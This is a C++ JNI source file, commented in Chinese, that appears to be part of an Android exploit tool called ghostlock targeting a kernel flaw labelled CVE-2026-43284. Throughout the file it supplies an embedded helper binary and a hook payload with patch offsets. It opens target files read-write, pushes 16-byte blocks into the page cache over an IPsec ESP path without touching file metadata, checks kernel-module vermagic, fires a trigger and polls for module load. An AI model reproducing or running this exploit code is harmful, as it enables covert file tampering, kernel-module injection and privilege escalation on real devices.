/** @file jni/api_43284_device.cpp
 *  43284 的**数据性**设备缝：本构建自带的字节与钩子计划（不需要设备就能算出来的那部分）。
 *
 *  它们与旧的帧实现（ops_43284_device.cpp）用的是同一批来源：embed 的两张图与 hook 的 sentry 计划，
 *  所以真机上的摘要/数字必须与旧路径逐位一致 —— 门禁正是拿 manifest 里的值对拍。
 *
 *  其余缝（resolve / write_block / read_block / module_check / trigger / wait_terminal）属于真正的
 *  设备工作（J7.5 的 43284 链），不在这里。
 */
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
#include <cstring>
#include <sys/stat.h>
#include <cstddef>
#include <cstdint>
#include <span>
#include <arpa/inet.h>
#include <fcntl.h>
#include <memory>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/lkm/module_facts.hpp"
#include "jni/api_43284.hpp"

namespace ghostlock::jni {
    namespace {
    /** 已开的门：一个 slot 一个 fd。token = slot + 1（0 留给"没有门"）。 */
    struct OpenDoor final {
        int fd = -1;
        std::string path{};
    };
    constexpr std::size_t kMaxDoors = 8U;
    OpenDoor g_doors[kMaxDoors] = {};
        /** 载荷的落点；缝返回的 span 必须在调用期间有效。 */
        std::uint8_t g_payload[1024] = {};
        std::size_t g_payload_size = 0U;

        bool device_embedded_image(const std::int32_t role, std::span<const std::byte> &image,
                                 void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            if (role == kImageSpliceHelper) {
                const auto *bytes = embed::splicehelper_bytes();
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(bytes),
                                                   embed::splicehelper_padded_size());
                return true;
            }
            if (role == kImageLandingPayload) {
                const hook::SentryPlan plan = hook::device_sentry_plan();
                std::size_t size = 0U;
                if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                    hook::SentryError::Ok) {
                    return false;
                }
                g_payload_size = size;
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                   g_payload_size);
                return true;
            }
            return false;
        }

        bool device_hook_plan(const Init43284Values &, const HookPlanRequest43284Values &,
                            std::uint64_t &branch_word, std::uint64_t &displaced_word,
                            std::uint64_t &site_offset, std::uint64_t &landing_offset,
                            std::span<const std::byte> &payload, void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            const hook::SentryPlan plan = hook::device_sentry_plan();
            std::uint32_t branch = 0U;
            if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
                return false;
            }
            std::size_t size = 0U;
            if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                hook::SentryError::Ok) {
                return false;
            }
            g_payload_size = size;
            branch_word = branch;
            displaced_word = plan.displaced_instruction;
            site_offset = plan.hook_file_offset;
            landing_offset = plan.payload_file_offset;
            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                 g_payload_size);
            return true;
        }
        /**
         *  按会话的落地装配：门 → 双门对象 → 拼接面 → 窗口 → 落地。
         *
         *  @note RealSpliceIo 与 PageCacheWrite 都不可拷贝，所以整包挂堆上（unique_ptr），与门表同生命周期；
         *        resolve 每次先销毁旧的再建新的。会话真正结束时的销毁需要收尾钩子 —— 当前 API 没有，登记为债。
         */
        struct Landing43284 final {
            backend::cve_2026_43284::landing::PageCacheDoorLinux door;
            backend::cve_2026_43284::landing::RealSpliceIo io;
            backend::cve_2026_43284::landing::PageCacheWrite window;
            backend::cve_2026_43284::landing::PageCacheLanding landing;
            bool up = false;

            /** @param path 载体路径（Kotlin 给） @param sa 会话凭据（Kotlin 给） */
            Landing43284(const char *path, const std::size_t length,
                         const backend::cve_2026_43284::SaMaterial &sa) noexcept
                : door(path, length),
                  io(backend::cve_2026_43284::landing::real_splice_io(), door.open_target()),
                  window(door, io),
                  landing(window) {
                up = door.usable() && landing.bring_up_with(sa);
            }
        };
        std::unique_ptr<Landing43284> g_session;
        /** 设备工作：这个路径现在存在吗。 */
        bool path_exists(const char *path) noexcept {
            struct stat info {};
            return path != nullptr && ::stat(path, &info) == 0;
        }
        /** 设备工作：睡一个轮询间隔。 */
        void sleep_ms(const std::uint32_t ms) noexcept {
            ::usleep(static_cast<useconds_t>(ms) * 1000U);
        }
    }  // namespace

    /**
     *  模块校验：从镜像字节里读出事实，再按内核自己的规则比对 vermagic。纯计算，不需要设备权限，
     *  这正是它能先接线的原因；失败由上层给具名拒绝（module-check-refused）。
     */
    bool device_module_check(const Init43284Values &, const ModuleCheck43284Values &request,
                             void *) noexcept {
        using namespace ghostlock::backend::cve_2026_43284;
        const lkm::ModuleFacts facts =
            lkm::read_module_facts(request.moduleImage.data(), request.moduleImage.size());
        if (!facts.elf_valid || !facts.has_vermagic || facts.vermagic[0] == '\0') {
            /* 不是内核能接受的模块（错 ELF / 没 .modinfo / 没 vermagic）：具名交给上层。 */
            return false;
        }
        const std::string kernel(reinterpret_cast<const char *>(request.kernelVermagic.data()),
                                 request.kernelVermagic.size());
        return lkm::vermagic_matches_kernel(facts.vermagic, kernel.c_str(), facts.has_crcs);
    }

    /**
     *  等终态：在 <moduleName> 指向的文件里找三种 marker 之一，预算内按 pollMs 轮询。
     *
     *  三态都是**真实答案**，不是猜的：找到 successMarker ⇒ success；找到 failureMarker ⇒ failure；
     *  文件不在、或只有 inFlightMarker、或预算用尽 ⇒ inflight。上层据此给 Ok / Failed / InFlight。
     */
    /**
     *  等终态：**复用** steps 里那个实现（wait_for_module），由 native 只提供两件设备工作：
     *  exists 用 stat、sleep_ms 用 usleep。
     *
     *  具名原因到三态的对应（照实现读出来的，不是猜的）：
     *  - nullptr ⇒ Success；
     *  - failure-marker / module-gone ⇒ Failure；
     *  - timeout-while-running（预算用尽仍在跑）⇒ **InFlight**（既非成功也非失败）；
     *  - 时钟没接（no clock）⇒ 也算 Failure —— 那是接线错误，不该发生。
     */
    bool device_wait_terminal(const Init43284Values &, const Wait43284Values &request,
                              TerminalState &terminal, void *) noexcept {
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string success = text_of(request.successMarker);
        const std::string failure = text_of(request.failureMarker);
        const std::string in_flight = text_of(request.inFlightMarker);
        const std::string module_name = text_of(request.moduleName);
        backend::cve_2026_43284::steps::WaitRequest wait{};
        wait.success_marker = success.c_str();
        wait.failure_marker = failure.c_str();
        wait.in_flight_marker = in_flight.c_str();
        wait.module_name = module_name.c_str();
        wait.budget_ms = static_cast<std::uint32_t>(request.budgetMs);
        wait.poll_ms = static_cast<std::uint32_t>(request.pollMs > 0 ? request.pollMs : 10);
        wait.exists = &path_exists;
        wait.sleep_ms = &sleep_ms;
        const char *const reason = backend::cve_2026_43284::steps::wait_for_module(wait);
        if (reason == nullptr) {
            terminal = TerminalState::Success;
            return true;
        }
        terminal = std::strcmp(reason, "step-wait-timeout") == 0 ? TerminalState::InFlight
                                                                   : TerminalState::Failure;
        return true;
    }

    bool device_trigger(const Init43284Values &, const Trigger43284Values &request, void *) noexcept {
        const char *const who = ghostlock::backend::cve_2026_43284::steps::trigger_orphan(
            static_cast<std::uint32_t>(request.delayMs));
        return who == nullptr;
    }

    /**
     *  读回一块：从门那扇 fd 上 pread 十六字节（设备工作）。
     *
     *  @return 读到十六字节为 true；门没开、偏移越界、短读都是 false（上层给 block-read-refused）。
     *  @note 这一半只读**盘上现存的内容**：写还没接线（ESP 路线），所以内容不会等于最近一次写，
     *        状态机因此不会走到 Applied —— 这是如实的，不是缺陷。
     */
    /**
     *  写一块：走落地对象的 land_block（ESP 路线）；成功只到 Dispatched，并把序号往前推。
     *
     *  @return 落地对象不可用、门不对、或 land_block 拒绝时为 false（上层给 block-refused）。
     */
    bool device_write_block(const Init43284Values &, const WriteBlock43284Values &request,
                            const std::uint64_t door_token, std::uint64_t &sequence,
                            void *) noexcept {
        if (g_session == nullptr || !g_session->up || request.block.size() != 16U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        if (!g_session->landing.land_block(static_cast<std::uint64_t>(request.offset),
                                          request.block.data())) {
            return false;
        }
        sequence += 1U;
        g_session->landing.adopt_sequence(static_cast<std::uint32_t>(sequence));
        return true;
    }

    bool device_read_block(const Init43284Values &, const ReadBlock43284Values &request,
                           const std::uint64_t door_token, const std::span<std::byte> out,
                           void *) noexcept {
        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        const ssize_t got = ::pread(g_doors[slot].fd, out.data(), out.size(),
                                    static_cast<off_t>(request.offset));
        return got == static_cast<ssize_t>(out.size());
    }

    backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
        backend::cve_2026_43284::SaMaterial sa{};
        sa.spi = static_cast<std::uint32_t>(params.spi);
        sa.encap_port = static_cast<std::uint16_t>(params.encapPort);
        sa.sender_port = static_cast<std::uint16_t>(params.senderPort);
        sa.icv_len = static_cast<std::uint8_t>(params.icvLength);
        bool any_key_byte = false;
        for (std::size_t index = 0U; index < 32U; ++index) {
            sa.aes_key[index] = params.aesKey.data()[index];
            sa.hmac_key[index] = params.hmacKey.data()[index];
            any_key_byte = any_key_byte || sa.aes_key[index] != 0U || sa.hmac_key[index] != 0U;
        }
        /* 全零密钥不是凭据（与 access_params.hpp 同一条规则）：没有材料，门就不开。 */
        sa.set = any_key_byte;
        return sa;
    }


    /** 关掉一个 slot 上的门（复用 slot 或替换目标时先关）。 */
    void close_door(OpenDoor &door) noexcept {
        if (door.fd >= 0) {
            static_cast<void>(::close(door.fd));
            door.fd = -1;
        }
        door.path.clear();
    }

    /**
     *  开一扇门：以 O_RDWR 打开目标文件，并把 fd 的 slot 编号当 token 交出去。
     *
     *  这是门的第一半（能打开、能读写）；真正让写入"不改文件元数据地落进页缓存"的那一半是 ESP 路线
     *  （write_block / read_block 接 landing 的 land_block/read_block），还没接线 —— 所以现在
     *  写仍然是 block-refused，而不是"看起来写成功了"。
     */
    bool device_resolve(const Init43284Values &params_argv, const ResolveTarget43284Values &request,
                        std::uint64_t &token, void *) noexcept {
        const std::string path(reinterpret_cast<const char *>(request.path.data()), request.path.size());
        if (path.empty()) {
            return false;
        }
        const int fd = ::open(path.c_str(), O_RDWR | O_CLOEXEC);
        if (fd < 0) {
            return false;
        }
        for (std::size_t index = 0U; index < kMaxDoors; ++index) {
            if (g_doors[index].fd < 0) {
                g_doors[index].fd = fd;
                g_doors[index].path = path;
                token = index + 1U;
                /* 门开了就把落地装配建起来：载体路径来自请求，凭据来自会话参数。 */
                g_session.reset();
                g_session = std::make_unique<Landing43284>(
                    path.c_str(), path.size(), sa_material_of(params_argv));
                return true;
            }
        }
        static_cast<void>(::close(fd));
        return false;
    }

    /** 本构建能提供的 43284 缝（其余留空 ⇒ 那些函数以 op-not-wired 具名拒绝）。 */
    DeviceOps43284 device_ops_43284() noexcept {
        DeviceOps43284 ops{};
        ops.embedded_image = &device_embedded_image;
        ops.hook_plan = &device_hook_plan;
        ops.resolve = &device_resolve;
        ops.module_check = &device_module_check;
        ops.read_block = &device_read_block;
        ops.write_block = &device_write_block;
        ops.trigger = &device_trigger;
        ops.wait_terminal = &device_wait_terminal;
        return ops;
    }
}  // namespace ghostlock::jni

